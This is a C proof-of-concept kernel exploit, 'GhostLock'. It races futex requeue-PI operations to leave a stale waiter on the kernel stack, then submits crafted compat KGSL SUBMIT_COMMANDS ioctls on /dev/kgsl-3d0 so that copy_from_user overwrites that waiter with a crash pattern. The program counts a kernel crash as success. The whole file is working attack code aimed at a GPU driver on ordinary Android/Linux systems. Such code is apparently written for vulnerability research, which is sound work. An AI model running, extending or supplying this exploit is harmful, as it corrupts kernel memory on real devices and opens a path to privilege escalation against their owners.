/**
 * ghostlock_e2e.c — End-to-end: GhostLock + compat SUBMIT_COMMANDS + CFU
 *
 * Uses the CORRECT compat struct layout (ptr at +0x20, per disassembly).
 * If CFU hits the waiter, kernel crashes.
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[waiter] pi_chain locked\n");
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);
    printf("[waiter] ⚠️  Stale waiter on kernel stack!\n");

    /* ── KGSL ── */
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("[kgsl] fd=%d\n", fd);

    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, 0xc0080913, &ctx);
    printf("[kgsl] CREATE: ret=%d id=%u\n", (int)r, ctx.id);
    if (r < 0) goto out;

    /* Crash pattern ibdesc */
    struct { uint64_t ga; uint64_t sw; } ib = {
        0x0ULL,
        0x4141414141414141ULL  /* CRASH IF CFU HITS WAITER */
    };

    /* Compat SUBMIT_COMMANDS (44 bytes, 0xc02c093d)
     * Based on disassembly: ptr at +0x20, size at +0x24 */
    uint8_t sbuf[44];
    memset(sbuf, 0, 44);
    *(uint32_t*)(sbuf+0x00) = ctx.id;
    /* These offsets match the compat wrapper disassembly:
     * ldp w8,w9,[x2,#0x20] → w8=*(x2+0x20)=ptr, w9=*(x2+0x24)=size
     * ldp w10,w11,[x2,#0x2c] → but that's at struct boundary
     * ldr w10,[x2,#0x18] → timestamp or numcmds
     * Let me put data at ALL the offsets the wrapper reads from */
    *(uint32_t*)(sbuf+0x18) = 0;   /* timestamp? */
    *(uint32_t*)(sbuf+0x20) = (uint32_t)(uintptr_t)&ib;  /* ptr */
    *(uint32_t*)(sbuf+0x24) = 16;  /* size */
    *(uint32_t*)(sbuf+0x28) = 1;   /* numcmds? */
    *(uint32_t*)(sbuf+0x2c) = 0;   /* last field */

    printf("\n[kgsl] ╔══════════════════════════════════╗\n");
    printf("[kgsl] ║  COMPAT CFU WITH CRASH PATTERN  ║\n");
    printf("[kgsl] ║  ibdesc.ga=0x%016llx           ║\n", (unsigned long long)ib.ga);
    printf("[kgsl] ║  ibdesc.sw=0x%016llx           ║\n", (unsigned long long)ib.sw);
    printf("[kgsl] ╚══════════════════════════════════╝\n\n");

    errno = 0;
    r = ioctl(fd, 0xc02c093d, sbuf);
    printf("[kgsl] SUBMIT(compat): ret=%d errno=%d (%s)\n",
           (int)r, errno, r < 0 ? strerror(errno) : "OK");
    if (r == 0)
        printf("[kgsl] ⚠️  CFU executed — kernel should crash if waiter hit!\n");

    ioctl(fd, 0x40040914, &ctx.id);
out:
    close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_target locked\n");
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_chain locked\n");
    while (!kgsl_done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  GhostLock + COMPAT CFU — END TO END   ║\n");
    printf("║  ⚠️  KERNEL CRASH = SUCCESS!           ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ GhostLock! ret=%ld\n\n", r); break; }
        usleep(1000);
    }

    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED ===\n");
    return 0;
}
